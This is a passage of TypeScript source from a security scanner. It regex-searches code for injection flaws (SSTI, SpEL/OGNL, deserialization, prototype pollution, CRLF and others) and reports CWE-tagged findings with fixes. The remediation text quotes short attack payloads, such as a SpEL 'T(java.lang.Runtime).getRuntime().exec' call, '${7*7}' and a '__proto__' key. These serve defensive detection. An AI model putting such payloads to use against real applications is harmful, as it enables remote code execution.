  // Two-pass file-correlation: avoids multiline regex that would trigger ReDoS
  // detector and can never match in line-by-line search mode.
  const dbHits = await codeSearch(
    String.raw`(?:findOne|findById|findAll|findMany|getUser|getRecord)\s*\(`
  );
  if (!dbHits.length) return null;
  const dbFiles = new Set(dbHits.map((h) => h.file));
  const sinkHits = await codeSearch(
    String.raw`(?:SELECT|INSERT|UPDATE|DELETE)\s*['"` + "`" + String.raw`]|exec\s*\(userInput|compile\s*\(userInput|render\s*\(userInput`
  );
  const hits = sinkHits.filter((h) => dbFiles.has(h.file));
  if (!hits.length) return null;
  return {
    id: "SECOND_ORDER_INJECTION",
    title: "Data retrieved from DB/store passed directly to SQL/template/shell sink without re-validation — second-order injection",
    severity: "CRITICAL",
    evidence: toEvidence(hits),
    files: toFiles(hits),
    requiredActions: [
      "Treat data read from a database as untrusted — re-validate before passing to SQL, template, or shell sinks.",
      "CWE-89 / CWE-94 / CWE-78 — second-order injection exploits stored user-controlled data after it bypasses first-pass input validation.",
      "Fix: always sanitize or parameterize values returned from the DB before using them in downstream sinks."
    ]
  };
}

async function checkSstiJavaPhp(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`(?:freemarker\.template|VelocityEngine|Template\.getInstance|cfg\.getTemplate|\$twig->render|\$smarty->display|mako\.template\.Template)\s*\([^)]*(?:request|req\.|userInput|getParam)`
  );
  if (!hits.length) return null;
  return {
    id: "SSTI_JAVA_PHP_ENGINES",
    title: "Java/PHP template engine (Freemarker/Velocity/Twig/Smarty) compiles user input — SSTI RCE",
    severity: "CRITICAL",
    evidence: toEvidence(hits),
    files: toFiles(hits),
    requiredActions: [
      "Never pass user input as the template source to Freemarker, Velocity, Twig, Smarty, or Mako.",
      "CWE-94 / ATT&CK T1059 — SSTI in Java template engines enables RCE via expression evaluation (e.g. ${7*7} → arbitrary method calls).",
      "Fix: load templates from the filesystem at startup; pass user data only as context variables, never as template source."
    ]
  };
}

async function checkSpelOgnlInjection(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`(?:SpelExpressionParser|parseExpression|ExpressionParser|OgnlContext|Ognl\.getValue|Ognl\.parseExpression|MVEL\.eval)\s*\([^)]*(?:request\.getParameter|userInput|req\.)`
  );
  if (!hits.length) return null;
  return {
    id: "SPEL_OGNL_INJECTION",
    title: "Spring SpEL/OGNL/MVEL expression parser evaluates user input — RCE via T(java.lang.Runtime)",
    severity: "CRITICAL",
    evidence: toEvidence(hits),
    files: toFiles(hits),
    requiredActions: [
      "Never pass user-controlled input directly to SpEL, OGNL, or MVEL expression parsers.",
      "CWE-94 / ATT&CK T1059 — T(java.lang.Runtime).getRuntime().exec('id') achieves RCE via SpEL expression evaluation.",
      "Fix: use a SimpleEvaluationContext with a restricted type locator, or validate input against a strict allowlist before evaluation."
    ]
  };
}

async function checkPickleDeserialize(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`(?:pickle\.loads?\s*\(|cPickle\.loads?\s*\(|Marshal\.load\s*\(|joblib\.load\s*\(|torch\.load\s*\(|numpy\.load\s*\([^)]*allow_pickle\s*=\s*True)`
  );
  if (!hits.length) return null;
  return {
    id: "PICKLE_MARSHAL_DESERIALIZATION",
    title: "Python pickle.loads/Marshal.load deserializes user data — RCE gadget chain risk (CWE-502)",
    severity: "CRITICAL",
    evidence: toEvidence(hits),
    files: toFiles(hits),
    requiredActions: [
      "Never deserialize pickle, Marshal, or joblib data from untrusted sources — there is no safe way to sandbox pickle.loads.",
      "CWE-502 / ATT&CK T1059 — a crafted pickle payload executes arbitrary Python via __reduce__ during deserialization.",
      "Fix: use JSON or MessagePack with a strict schema; for ML models use ONNX or safetensors instead of torch.load/joblib.load."
    ]
  };
}

async function checkJavaDeserialize(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`(?:new\s+ObjectInputStream\s*\(|readObject\s*\(\s*\)|readUnshared\s*\(\s*\)|XMLDecoder\s*\(|XStream\.fromXML\s*\(|Kryo\.readObject)`
  );
  if (!hits.length) return null;
  return {
    id: "JAVA_OBJECT_DESERIALIZATION",
    title: "Java ObjectInputStream.readObject/XStream/Kryo deserializes untrusted data — gadget chain RCE (CWE-502)",
    severity: "CRITICAL",
    evidence: toEvidence(hits),
    files: toFiles(hits),
    requiredActions: [
      "Avoid Java native deserialization from untrusted sources; use serialization filters (JEP 290) if unavoidable.",
      "CWE-502 / ATT&CK T1059 — Apache Commons Collections gadget chains achieve RCE via ObjectInputStream.readObject().",
      "Fix: replace with JSON/Protobuf; if ObjectInputStream is required, implement a strict allowlisting ObjectInputFilter."
    ]
  };
}

async function checkCssInjection(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`(?:style\s*=\s*\{\{[^}]*(?:req\.|params\.|query\.)|createGlobalStyle`+"`"+String.raw`[^`+"`"+String.raw`]*\$\{(?:req|params|query)|css`+"`"+String.raw`[^`+"`"+String.raw`]*\$\{(?:req|params|query))`
  );
  if (!hits.length) return null;
  return {
    id: "CSS_INJECTION",
    title: "User input in CSS-in-JS or style attribute — CSS injection enabling data exfiltration (CWE-79)",
    severity: "HIGH",
    evidence: toEvidence(hits),
    files: toFiles(hits),
    requiredActions: [
      "Never interpolate user input directly into CSS-in-JS template literals or inline style attributes.",
      "CWE-79 — CSS injection via expression() or url() can exfiltrate sensitive data to attacker-controlled servers.",
      "Fix: validate CSS property values against a strict allowlist; never accept raw CSS strings from users."
    ]
  };
}

async function checkElasticsearchInjection(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`(?:client\.search\s*\(|esClient\.search\s*\()[^)]*(?:req\.|body\.|params\.|query\.)|(?:query_string|script\.source)\s*:\s*(?:req\.|body\.|params\.|query\.)`
  );
  if (!hits.length) return null;
  return {
    id: "ELASTICSEARCH_INJECTION",
    title: "Elasticsearch query_string or script.source uses user input — Painless script injection (CWE-943)",
    severity: "HIGH",
    evidence: toEvidence(hits),
    files: toFiles(hits),
    requiredActions: [
      "Never pass user input directly to Elasticsearch query_string or script.source — use match/term queries with explicit field mapping.",
      "CWE-943 — Elasticsearch Painless script injection via script.source can read cluster data or cause DoS.",
      "Fix: use structured queries (match, term, range) with user input as values, never as query syntax; disable dynamic scripting."
    ]
  };
}

async function checkWebSocketInjection(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`(?:ws\.on\s*\(\s*['"]message['"]|socket\.on\s*\(\s*['"]message['"])[\s\S]{0,300}(?:eval\s*\(|exec\s*\(|compile\s*\(|\.find\s*\(|\.query\s*\(|render\s*\()`
  );
  if (!hits.length) return null;
  return {
    id: "WEBSOCKET_MESSAGE_INJECTION",
    title: "WebSocket message data passed to injection sinks without validation (CWE-20)",
    severity: "HIGH",
    evidence: toEvidence(hits),
    files: toFiles(hits),
    requiredActions: [
      "Validate and sanitize all WebSocket message payloads before passing to eval, exec, DB query, or template sinks.",
      "CWE-20 — WebSocket messages bypass HTTP-layer input validation; treat them as untrusted user input.",
      "Fix: parse WebSocket messages with a strict Zod schema; never pass raw message data to eval(), exec(), or query functions."
    ]
  };
}

async function checkBracketNotationPollution(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`\w+\s*\[\s*(?:req\.|body\.|params\.|query\.|key\b|prop\b|field\b)[^\]]*\]\s*=`
  );
  const unsafe = hits.filter(
    (h) => !/allowlist|allowedKeys|ALLOWED_KEYS|Object\.create\(null\)/.test(h.preview)
  );
  if (!unsafe.length) return null;
  return {
    id: "BRACKET_NOTATION_POLLUTION",
    title: "Dynamic property assignment with user-controlled key — prototype pollution via bracket notation (CWE-1321)",
    severity: "HIGH",
    evidence: toEvidence(unsafe),
    files: toFiles(unsafe),
    requiredActions: [
      "Validate property keys against an explicit allowlist before dynamic assignment; use Object.create(null) for key-value stores.",
      "CWE-1321 — obj[req.body.key] = value with key='__proto__' or 'constructor' pollutes the prototype chain.",
      "Fix: const ALLOWED = new Set(['name','email']); if (!ALLOWED.has(key)) throw new Error('Invalid key');"
    ]
  };
}

async function checkSseCrlfInjection(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`(?:res\.write\s*\(\s*[` + "`" + String.raw`'"]data:\s*\$\{|res\.write\s*\([^)]*(?:req\.|body\.|params\.|query\.)[^)]*(?:\\n|\\r))`
  );
  if (!hits.length) return null;
  return {
    id: "SSE_CRLF_INJECTION",
    title: "SSE stream write with user input — CRLF injection into event stream (CWE-113)",
    severity: "HIGH",
    evidence: toEvidence(hits),
    files: toFiles(hits),
    requiredActions: [
      "Strip or encode CRLF characters from user input before writing to SSE streams.",
      "CWE-113 — CRLF injection into SSE data: fields can inject fake events or terminate the event stream.",
      String.raw`Fix: const safe = userValue.replace(/[\r\n]/g, ' '); res.write('data: ' + safe + '\n\n');`
    ]
  };
}

async function checkPdfDocInjection(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`(?:pdfmake\.createPdf|new\s+jsPDF|puppeteer\.goto|page\.goto|wkhtmltopdf|docxtemplater|new\s+PizZip)\s*\([^)]*(?:req\.|body\.|params\.|query\.|user\.)`
  );
  if (!hits.length) return null;
  return {
    id: "PDF_DOCUMENT_INJECTION",
    title: "PDF/Office generation library uses user input — formula injection or SSRF via file:// URL (CWE-74)",
    severity: "HIGH",
    evidence: toEvidence(hits),
    files: toFiles(hits),
    requiredActions: [
      "Sanitize user input before passing to PDF/Office generation libraries — strip formula-triggering characters (=, +, -, @) and validate URLs.",
      "CWE-74 — formula injection in generated spreadsheets can execute commands when opened; file:// URLs in headless browsers cause SSRF.",
      "Fix: prefix cell values starting with =,+,-,@ with a single quote; validate puppeteer URLs against an allowlist blocking file://, localhost."
    ]
  };
}

async function checkHttpResponseSplitting(): Promise<Finding | null> {
  const hits = await codeSearch(
    String.raw`(?:writeHead\s*\(\s*\d+\s*,\s*(?:req\.|body\.|params\.)|headers\.set\s*\([^,]+,\s*(?:req\.|body\.|params\.))`
  );
  const unsafe = hits.filter(
    (h) => !/replace.*\\r|replace.*\\n|encodeURIComponent/.test(h.preview)
  );
  if (!unsafe.length) return null;
  return {
    id: "HTTP_RESPONSE_SPLITTING",
    title: "HTTP response splitting via writeHead or headers.set with user input (CWE-113)",
    severity: "HIGH",
    evidence: toEvidence(unsafe),
    files: toFiles(unsafe),
    requiredActions: [
      "Strip CRLF characters from all user-controlled values before passing to writeHead or headers.set.",
      "CWE-113 — HTTP response splitting via CRLF injection enables cache poisoning, XSS, and session fixation.",
      String.raw`Fix: const safe = value.replace(/[\r\n]/g, ''); res.writeHead(200, { 'X-Header': safe });`
    ]
  };
}

// ─────────────────────────────────────────────────────────────────────────────

export async function checkInjectionDeep(_opts: { changedFiles: string[] }): Promise<Finding[]> {
  try {
    const results = await Promise.all([
      checkXxe(),
      checkSsti(),
      checkPrototypePollution(),
      checkOpenRedirect(),
      checkNosqlInjection(),
      checkCrlfInjection(),
      checkYamlUnsafeLoad(),
      checkUnsafeDeserialize(),
      checkPathTraversal(),
      checkLogInjection(),
      checkSsrfUserUrl(),
      checkCommandInjection(),
      checkRedos(),
      checkJsonpCallbackInjection(),
      checkEvalEncodedPayload(),
      // New checks
      checkSqlInjection(),
      checkMongoAggregationInjection(),
      checkLdapInjection(),
      checkXpathInjection(),
      checkJndiInjection(),
      checkRedisEvalInjection(),
      checkSecondOrderInjection(),
      checkSstiJavaPhp(),
      checkSpelOgnlInjection(),
      checkPickleDeserialize(),
      checkJavaDeserialize(),
      checkCssInjection(),
      checkElasticsearchInjection(),
      checkWebSocketInjection(),
      checkBracketNotationPollution(),
      checkSseCrlfInjection(),
      checkPdfDocInjection(),
      checkHttpResponseSplitting(),
    ]);
    return results.flat().filter((f): f is Finding => f !== null);
  } catch (err) {
    console.warn("[checkInjectionDeep] Internal error:", sanitizeErrorMessage(err instanceof Error ? err.message : String(err)));
    return [];
  }
}
